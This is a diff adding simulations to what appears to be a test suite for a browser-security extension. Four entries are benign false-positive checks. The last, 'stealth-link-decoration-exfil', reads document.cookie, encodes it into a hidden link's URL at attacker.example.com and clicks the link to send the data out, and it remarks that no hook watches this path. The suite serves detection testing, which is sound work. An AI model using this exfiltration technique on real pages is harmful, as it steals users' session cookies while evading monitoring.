@@ -3577,6 +3577,197 @@ const attacks: AttackDef[] = [
         }
       }),
   },
+
+  // --- Benign Bait (false positive checks) ---
+  {
+    id: "benign-fullscreen-video",
+    name: "Benign Fullscreen Video Player",
+    category: "injection",
+    description:
+      "Creates a video element and calls requestFullscreen() on it — " +
+      "legitimate video players use fullscreen. The fullscreen hook fires on ALL requestFullscreen calls. " +
+      "If this triggers fullscreen_phishing alert, it's a false positive.",
+    severity: "low",
+    simulate: (page) =>
+      page.evaluate(async () => {
+        const startTime = performance.now();
+        try {
+          const video = document.createElement("video");
+          video.src = "data:video/mp4;base64,AAAAHG";
+          video.muted = true;
+          document.body.appendChild(video);
+          try {
+            await video.requestFullscreen();
+          } catch {
+            // Expected: browsers may block fullscreen without user gesture in headless mode
+          } finally {
+            if (document.fullscreenElement) {
+              await document.exitFullscreen().catch(() => {});
+            }
+            document.body.removeChild(video);
+          }
+          return {
+            blocked: false,
+            executionTime: performance.now() - startTime,
+            details:
+              "BENIGN: requestFullscreen() on a video element completed — " +
+              "if the extension raised fullscreen_phishing here it is a false positive",
+          };
+        } catch (error: any) {
+          return {
+            blocked: false,
+            executionTime: performance.now() - startTime,
+            details: `BENIGN: requestFullscreen() threw (${error?.message}) — benign video fullscreen, not an attack`,
+          };
+        }
+      }),
+  },
+  {
+    id: "benign-geolocation-map",
+    name: "Benign Geolocation Map Lookup",
+    category: "privacy",
+    description:
+      "Calls navigator.geolocation.getCurrentPosition() — this is what every map app does. " +
+      "The hook fires on all geolocation calls. If this triggers geolocation_access, it's a false positive.",
+    severity: "low",
+    simulate: (page) =>
+      page.evaluate(async () => {
+        const startTime = performance.now();
+        try {
+          await new Promise<void>((resolve) => {
+            navigator.geolocation.getCurrentPosition(
+              () => resolve(),
+              () => resolve(), // permission denied or unavailable — still benign
+              { timeout: 2000, maximumAge: 60000 },
+            );
+          });
+          return {
+            blocked: false,
+            executionTime: performance.now() - startTime,
+            details:
+              "BENIGN: navigator.geolocation.getCurrentPosition() called as a map app would — " +
+              "if the extension raised geolocation_access here it is a false positive",
+          };
+        } catch (error: any) {
+          return {
+            blocked: false,
+            executionTime: performance.now() - startTime,
+            details: `BENIGN: geolocation call threw (${error?.message}) — benign map lookup, not an attack`,
+          };
+        }
+      }),
+  },
+  {
+    id: "benign-sendbeacon-analytics",
+    name: "Benign sendBeacon Analytics Ping",
+    category: "covert",
+    description:
+      "Calls navigator.sendBeacon() with a small analytics payload — this is what Google Analytics does. " +
+      "The hook fires on all sendBeacon calls. If this triggers send_beacon, it's a false positive.",
+    severity: "low",
+    simulate: (page) =>
+      page.evaluate(async () => {
+        const startTime = performance.now();
+        try {
+          const payload = JSON.stringify({ event: "page_view", page: location.pathname, ts: Date.now() });
+          const queued = navigator.sendBeacon("/beacon", new Blob([payload], { type: "application/json" }));
+          return {
+            blocked: false,
+            executionTime: performance.now() - startTime,
+            details:
+              `BENIGN: navigator.sendBeacon() called with analytics payload (queued=${queued}) — ` +
+              "if the extension raised send_beacon here it is a false positive",
+          };
+        } catch (error: any) {
+          return {
+            blocked: false,
+            executionTime: performance.now() - startTime,
+            details: `BENIGN: sendBeacon threw (${error?.message}) — benign analytics ping, not an attack`,
+          };
+        }
+      }),
+  },
+  {
+    id: "benign-notification-chat",
+    name: "Benign Chat Notification",
+    category: "phishing",
+    description:
+      "Creates a new Notification('New message from Alice') — chat apps do this constantly. " +
+      "If this triggers notification_phishing, it's a false positive.",
+    severity: "low",
+    simulate: (page) =>
+      page.evaluate(async () => {
+        const startTime = performance.now();
+        try {
+          // Request permission first (will be denied in headless, but the call itself is benign)
+          const permission = Notification.permission;
+          if (permission === "granted") {
+            const n = new Notification("New message from Alice", {
+              body: "Hey, are you free later?",
+              icon: "/favicon.ico",
+            });
+            n.close();
+          }
+          return {
+            blocked: false,
+            executionTime: performance.now() - startTime,
+            details:
+              `BENIGN: new Notification() called as a chat app would (permission=${permission}) — ` +
+              "if the extension raised notification_phishing here it is a false positive",
+          };
+        } catch (error: any) {
+          return {
+            blocked: false,
+            executionTime: performance.now() - startTime,
+            details: `BENIGN: Notification() threw (${error?.message}) — benign chat notification, not an attack`,
+          };
+        }
+      }),
+  },
+
+  // --- Real Attack ---
+  {
+    id: "stealth-link-decoration-exfil",
+    name: "Stealth Link Decoration Exfiltration",
+    category: "network",
+    description:
+      "Exfiltrates data by modifying an anchor element's href to embed stolen data in URL parameters, " +
+      "then programmatically clicking the link. No hook monitors link.href modifications or programmatic " +
+      "anchor clicks for exfiltration.",
+    severity: "high",
+    simulate: (page) =>
+      page.evaluate(async () => {
+        const startTime = performance.now();
+        try {
+          const stolenData = btoa(
+            JSON.stringify({ session: document.cookie || "no-cookie", origin: location.origin, ts: Date.now() }),
+          );
+          const anchor = document.createElement("a");
+          // Embed stolen payload in query string — no hook watches href assignments
+          anchor.href = `https://attacker.example.com/track?d=${encodeURIComponent(stolenData)}`;
+          anchor.rel = "noopener noreferrer";
+          anchor.style.display = "none";
+          document.body.appendChild(anchor);
+          // Programmatic click — no hook monitors this for exfiltration
+          anchor.click();
+          document.body.removeChild(anchor);
+          return {
+            blocked: false,
+            executionTime: performance.now() - startTime,
+            details:
+              `Link decoration exfil executed — stolen payload (${stolenData.length} bytes base64) embedded in href ` +
+              "and programmatic anchor.click() triggered; no extension hook monitors href writes or anchor clicks",
+          };
+        } catch (error: any) {
+          const msg = error?.message ?? String(error);
+          return {
+            blocked: msg.includes("blocked") || msg.includes("ERR_BLOCKED"),
+            executionTime: performance.now() - startTime,
+            details: `Link decoration exfil failed: ${msg}`,
+          };
+        }
+      }),
+  },
 ];
 
 // ============================================================================
